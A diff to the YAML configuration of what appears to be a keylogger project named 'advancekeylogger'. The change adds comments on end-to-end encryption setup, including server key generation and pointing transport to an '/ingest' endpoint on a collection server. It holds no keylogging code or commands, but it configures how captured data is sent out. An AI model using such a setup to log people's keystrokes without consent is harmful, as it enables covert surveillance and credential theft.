@@ -81,13 +81,16 @@ encryption:
   mode: "symmetric"         # "symmetric" (AES-256-CBC) or "e2e"
   algorithm: "AES-256-CBC"
   key: ""
+  # E2E mode: generate server keys with `python -m server.run --generate-keys`,
+  # then set transport.method to "http" and transport.http.url to
+  # "http://<server-host>:8000/ingest".
   e2e:
     curve: "curve25519"
     signing: "ed25519"
     bulk_cipher: "aes-256-gcm"
     key_rotation_hours: 24
     key_store_path: "~/.advancekeylogger/keys/"
-    server_public_key: ""
+    server_public_key: ""   # base64-encoded X25519 public key from server
     pin_server_key: true
 
 compression:
